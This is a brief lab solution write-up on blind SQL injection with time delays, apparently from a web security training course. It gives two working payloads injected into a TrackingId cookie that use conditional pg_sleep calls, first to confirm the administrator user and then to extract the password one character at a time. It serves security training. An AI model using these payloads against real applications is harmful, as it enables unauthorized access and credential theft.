# Lab 10: Blind SQL Injection with Time Delays

* **Solution**: Inject a conditional time delay (e.g., pg_sleep) into TrackingId to confirm the admin user, then extract the password via delays per character.
* **Final Payloads**:
  * TrackingId=xyz'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users -- (confirm user)
  * TrackingId=xyz'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator' -- (repeat for each position)